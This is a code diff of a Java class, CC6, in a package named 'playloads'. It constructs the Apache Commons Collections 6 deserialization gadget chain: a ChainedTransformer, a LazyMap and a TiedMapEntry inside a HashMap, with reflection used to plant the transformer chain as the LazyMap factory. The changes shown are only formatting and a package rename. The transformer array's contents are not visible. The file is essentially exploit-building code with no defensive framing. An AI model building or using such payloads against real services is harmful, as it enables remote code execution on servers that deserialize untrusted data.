@@ -1,4 +1,4 @@
-package cn.hungslabsec.playloads;
+package playloads;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -15,6 +15,7 @@ import java.util.Map;
 
 public class CC6{
     public static void main(String[] args) throws Exception {
+
         System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
         Transformer[] transformers;
         transformers = new Transformer[]{
@@ -26,16 +27,17 @@ public class CC6{
         };
         ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
         HashMap<Object, Object> map = new HashMap<>();
-        Map<Object,Object> lazydMap = LazyMap.decorate(map,new ConstantTransformer(1));
+
+        Map<Object,Object> lazydMap = LazyMap.decorate(map, new ConstantTransformer(1));
         TiedMapEntry tiedMapEntry=new TiedMapEntry(lazydMap,"a");
 
-        HashMap<Object,Object> map2= new HashMap<>();
+        HashMap<Object,Object> map2 = new HashMap<>();
         map2.put(tiedMapEntry,"bbb");
         lazydMap.remove("a");
 
 
-        Class<LazyMap> c=LazyMap.class;
-        Field factoryField=c.getDeclaredField("factory");
+        Class<LazyMap> c = LazyMap.class;
+        Field factoryField = c.getDeclaredField("factory");
         factoryField.setAccessible(true);
         factoryField.set(lazydMap,chainedTransformer);
 
